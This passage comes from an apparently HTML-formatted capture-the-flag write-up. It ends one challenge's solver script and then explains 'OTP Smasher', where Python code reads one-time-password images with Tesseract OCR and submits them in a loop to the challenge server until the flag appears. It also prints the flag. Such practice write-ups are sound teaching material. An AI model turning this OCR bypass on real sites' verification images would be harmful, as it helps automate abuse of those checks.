            &lt;span class=&quot;n&quot;&gt;question&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;question&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;':'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;answer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;word_search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;grid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;answer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        
        &lt;span class=&quot;c1&quot;&gt;# Skip post-game lines
&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# Print the final output
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvrepeat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;script id=&quot;asciicast-orEe52FXgh8rILEeCu7o6GXZF&quot; src=&quot;https://asciinema.org/a/orEe52FXgh8rILEeCu7o6GXZF.js&quot; async=&quot;&quot;&gt;&lt;/script&gt;

&lt;h2 id=&quot;otp-smasher-283-points&quot;&gt;OTP Smasher (283 points)&lt;/h2&gt;
&lt;p&gt;This is a pretty interesting challenge because it requires us to do some &lt;em&gt;optical character recognition (OCR)&lt;/em&gt;. We’re presented with a simple webpage displaying a picture of numbers, an submission field, and a counter in the upper-left. &lt;em&gt;Chrome DevTools&lt;/em&gt; also shows that the page also attempts to display the image &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;static/flag.png&lt;/code&gt;. Based on the challenge’s name, the number picture might be intended to act as a &lt;em&gt;one-time password (OTP)&lt;/em&gt;. Submitting the OTP increments the upper-left counter by one and waiting too long to submit another OTP resets it to zero.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/imgs/hacktivity2021/smasher_1.png&quot; alt=&quot;OTP Smasher Page&quot; title=&quot;OTP Smasher Page&quot; /&gt;&lt;/p&gt;

&lt;p&gt;While this challenge was up, the creator eventually decided to increase the length of time allowed until a reset to help make the challenge a bit easier. So right now, we could technically manually submit 45 passwords to get the flag. But of course, that is no fun learning-wise and no fun because it’s super tedious. Using &lt;em&gt;Chrome DevTools&lt;/em&gt;, we were able to figure out the format of the submission: a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST&lt;/code&gt; request to the main page with the password in a field called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;otp_entry&lt;/code&gt;. Using this information, we are now able to automate OTP submissions.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;bs4&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BeautifulSoup&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bs&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Send the current `otp` to the server
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://challenge.ctf.games:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;otp_entry&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;otp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt; 

&lt;span class=&quot;c1&quot;&gt;# Print out the current counter value
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'html.parser'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The remaining problem is how to know what numbers to send? To accomplish this, we will make use of a software called &lt;a href=&quot;https://tesseract-ocr.github.io/&quot;&gt;Tesseract&lt;/a&gt; and its companion Python module, &lt;a href=&quot;https://pypi.org/project/pytesseract/&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pytesseract&lt;/code&gt;&lt;/a&gt;. Combining this with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;requests&lt;/code&gt; module to download the image and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PIL&lt;/code&gt; module to store the image, we can now automate OCR on the images to determine the OTP’s numbers.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pytesseract&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;PIL&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;io&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BytesIO&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Retrieve the current OTP image
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://challenge.ctf.games:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/static/otp.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Save the image into a PIL Image object
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;image&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BytesIO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# OCR the image to determine the OTP
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;otp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pytesseract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;image_to_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This gives us an 80% solution to the challenge. I say 80% because while it works &lt;em&gt;most&lt;/em&gt; of the time, it fails enough that we have to manually step in every once in awhile. There’s probably a way to train &lt;em&gt;tesseract&lt;/em&gt; to better recognize the OTP numbers, but we won’t dive into that realm for this challenge. For now, we’ll just check if the string from &lt;em&gt;tesseract&lt;/em&gt; is a number. If it isn’t, then have the user type in the OTP manually.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;c1&quot;&gt;# See if we get an error when converting the OTP to a number
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;otp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# If the OTP isn't a number, make the user type it in manually
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;otp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now that all of our components are created, we can combine them into the final script that’ll automatically send the OTPs to the server until it sees the flag: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag{f994cd9c756675b743b10c44b32e36b6}&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pytesseract&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;PIL&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;io&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BytesIO&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;bs4&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BeautifulSoup&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bs&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# Retrieve the current OTP image
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://challenge.ctf.games:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/static/otp.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# Save the image into a PIL Image object
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;image&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BytesIO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# OCR the image to determine the OTP
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;otp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pytesseract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;image_to_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;OTP - &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;otp&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# See if we get an error when converting the OTP to a number
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;otp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# If the OTP isn't a number, make the user type it in manually
&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;otp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# Send the current `otp` to the server
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;post&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://challenge.ctf.games:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;otp_entry&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;otp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt; 

    &lt;span class=&quot;c1&quot;&gt;# Print out the current counter value
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'html.parser'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;# Check if the flag image is available yet
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://challenge.ctf.games:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/static/flag.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status_code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;404&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# If we find the flag, save it and end the script
&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Flag found&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;flag.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;wb&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;script id=&quot;asciicast-da02LwqVd2u5WkZ9V7amQRRZG&quot; src=&quot;https://asciinema.org/a/da02LwqVd2u5WkZ9V7amQRRZG.js&quot; async=&quot;&quot;&gt;&lt;/script&gt;

